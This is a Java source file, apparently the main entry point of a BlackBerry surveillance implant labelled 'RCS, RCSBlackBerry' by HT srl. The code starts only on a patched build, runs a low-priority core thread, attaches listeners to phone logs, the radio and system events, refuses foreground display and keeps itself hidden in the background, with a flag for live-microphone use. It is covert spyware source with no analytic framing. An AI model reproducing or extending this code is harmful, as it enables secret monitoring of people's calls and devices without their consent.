//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : Main.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.UiApplication; 
//#ifdef TEST
import tests.MainTest; 
//#endif
import blackberry.config.Conf;
import blackberry.config.Keys;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Main.
 */

//#ifdef LIVE_MIC_ENABLED
public class Main extends UiApplication {
//#else
public class Main extends Application {
//#endif
    /**
     * The main method.
     * 
     * @param args
     *            the arguments
     */
    public static void main(final String[] args) {
        //#ifdef TEST
        if (args.length > 0) {
            System.out.println("Test");
            new MainTest();
            return;
        }
        //#endif       
    	
        final Keys keys = Keys.getInstance();
        final boolean binaryPatched = keys.hasBeenBinaryPatched();

        if (binaryPatched) {
            new Main().enterEventDispatcher();
        } else {
            //#ifdef DEBUG
            System.out.println("Not binary patched, bailing out!");
            //#endif
        }

    }

    private final Debug debug;
    AppListener appListener;

    /**
     * Instantiates a new main.
     */
    public Main() {
        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);

        appListener = AppListener.getInstance();
        final Core core = Core.getInstance();

        debug = new Debug("Main", DebugLevel.VERBOSE);
        //#ifdef DEBUG
        debug.info("RCSBlackBerry " + Version.VERSION);
        //#endif

        final Thread coreThread = new Thread(core);
        coreThread.setPriority(Thread.MIN_PRIORITY);
        coreThread.start();

        startListeners();

        goBackground();
    }

    /**
     * 
     */
    public void startListeners() {
        //#ifdef DEBUG
        debug.info("Starting Listeners");
        //#endif

        //Phone.addPhoneListener(appListener);
        addHolsterListener(appListener);        
        addSystemListener(appListener);      
        addRadioListener(appListener);
        PhoneLogs.addListener(appListener);
        
        goBackground();

    }
    
    /**
     * 
     */
    public void stopListeners() {
        //#ifdef DEBUG
        debug.info("Stopping Listeners");
        //#endif

        removeHolsterListener(appListener);
        removeSystemListener(appListener);
        removeRadioListener(appListener);
        
        //Phone.removePhoneListener(appListener);
        PhoneLogs.removeListener(appListener);
        
       

        goBackground();
    }

    public boolean acceptsForeground(){
        return false;
    }
    
    public void activate(){

    }
    
    public void deactivate(){

    }
    
    public void goBackground() {    	    	    
        if(!Conf.IS_UI){
            return;
        }
    
        invokeLater(new Runnable() {
            public void run() {         
                
                boolean foreground = false;
                //#ifdef LIVE_MIC_ENABLED
                UiApplication.getUiApplication().requestBackground();
                foreground = UiApplication.getUiApplication().isForeground();
                //#endif
                
                //#ifdef DEBUG
                debug.trace("Main foreground: " + foreground);
                //#endif
            }
        });

    }

}
